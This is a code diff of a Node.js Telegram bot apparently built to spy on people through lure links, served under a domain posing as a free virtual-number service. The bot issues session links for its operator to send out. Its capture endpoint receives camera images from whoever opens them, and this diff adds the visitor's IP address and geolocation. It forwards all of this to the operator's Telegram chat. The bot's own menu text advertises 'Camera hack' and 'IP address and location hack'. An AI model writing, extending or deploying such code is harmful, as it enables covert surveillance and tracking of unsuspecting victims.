@@ -9,11 +9,10 @@ const bot = new Telegraf(process.env.BOT_TOKEN);
 const app = express();
 
 // Middleware
-app.use(bodyParser.json({ limit: "15mb" }));
+app.use(bodyParser.json({ limit: "20mb" }));
 app.use(express.static(path.join(__dirname, "public"))); // serve frontend
 
-// Domain
-// Only fallback, no Render external URL
+// Domain fallback
 const DOMAIN = "https://freevirtualnumbers.onrender.com";
 
 // ===== User Tracking =====
@@ -30,7 +29,7 @@ setInterval(() => {
 }, 2 * 60 * 1000);
 
 function generateToken() {
-  return crypto.randomBytes(8).toString("hex"); // 16 char
+  return crypto.randomBytes(8).toString("hex");
 }
 
 // ===== Bot Menu =====
@@ -75,13 +74,14 @@ Select a module below to begin.
   );
 });
 
+// ===== Pool Mode =====
 bot.action("pool", async (ctx) => {
   await ctx.answerCbQuery();
   const token = generateToken();
   activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };
 
   const msg = await ctx.reply("⚙️ Initializing Pool Mode...");
-  await new Promise(r => setTimeout(r, 1800));
+  await new Promise(r => setTimeout(r, 1500));
 
   await ctx.telegram.editMessageText(
     ctx.chat.id,
@@ -97,20 +97,18 @@ bot.action("pool", async (ctx) => {
 
 Send this link and monitor interactions.
 `,
-    {
-      parse_mode: "HTML",
-      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
-    }
+    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
   );
 });
 
+// ===== Normal Mode =====
 bot.action("normal", async (ctx) => {
   await ctx.answerCbQuery();
   const token = generateToken();
   activeUsers[token] = { chat_id: ctx.chat.id, username: ctx.from.username, createdAt: Date.now() };
 
   const msg = await ctx.reply("⚙️ Preparing Normal Mode...");
-  await new Promise(r => setTimeout(r, 1800));
+  await new Promise(r => setTimeout(r, 1500));
 
   await ctx.telegram.editMessageText(
     ctx.chat.id,
@@ -126,13 +124,11 @@ bot.action("normal", async (ctx) => {
 
 Deploy and observe activity.
 `,
-    {
-      parse_mode: "HTML",
-      ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]])
-    }
+    { parse_mode: "HTML", ...Markup.inlineKeyboard([[Markup.button.callback("⬅ Back", "back")]]) }
   );
 });
 
+// Stats, Info, Dev, Back
 bot.action("stats", async (ctx) => {
   await ctx.answerCbQuery();
   await ctx.reply(`
@@ -153,12 +149,10 @@ bot.action("info", async (ctx) => {
 
 ━━━━━━━━━━━━━━━━━━
 
-This bot demonstrates an interactive Telegram menu system built with Telegraf.
-
 Features:
-• IP address and location hack
-• Camera hack
-• Secure unique session links expires 10 mins
+• Camera snapshot
+• IP & geolocation capture
+• Secure unique session links (10 min expiry)
 `, { parse_mode: "HTML" });
 });
 
@@ -183,10 +177,7 @@ bot.action("back", async (ctx) => {
 Select a module below.
 
 <i>Precision. Speed. Control.</i>`,
-    {
-      parse_mode: "HTML",
-      ...mainMenu()
-    }
+    { parse_mode: "HTML", ...mainMenu() }
   );
 });
 
@@ -195,10 +186,10 @@ app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public/index.html"));
 });
 
-// ===== API to receive image =====
+// ===== API to receive image + IP + location =====
 app.post("/api/capture", async (req, res) => {
   try {
-    const { image, token } = req.body;
+    const { image, token, ip, location } = req.body;
     if (!image) return res.status(400).json({ error: "No image provided" });
     if (!token || !activeUsers[token]) return res.status(400).json({ error: "Invalid or expired token" });
 
@@ -206,27 +197,23 @@ app.post("/api/capture", async (req, res) => {
     const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ""), "base64");
 
     await bot.telegram.sendPhoto(chat_id, { source: buffer }, {
-      caption: "📸 <b>IMAGE RECEIVED</b>",
+      caption: `📸 <b>IMAGE RECEIVED</b>
+
+🌐 IP: ${ip}
+📍 Location: ${location}`,
       parse_mode: "HTML"
     });
 
-    res.json({ status: "success", message: "Image sent to the correct user" });
+    res.json({ status: "success", message: "Image + IP + Location sent" });
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: "Server error" });
   }
 });
 
-// ===== Webhook for Render =====
+// ===== Start Server =====
 const PORT = process.env.PORT || 3000;
-const RENDER_EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
 
-if (!RENDER_EXTERNAL_URL) console.warn("RENDER_EXTERNAL_URL not set — webhook may fail!");
-
-bot.telegram.setWebhook(`${RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
-app.use(bot.webhookCallback(`/bot${process.env.BOT_TOKEN}`));
-
-app.listen(PORT, () => {
-  console.log(`Server running on port ${PORT}`);
-  console.log(`Telegram webhook set at ${RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`);
-});
+// Use long polling for simplicity (no Render webhook required)
+bot.launch().then(() => console.log("Telegram bot running"));
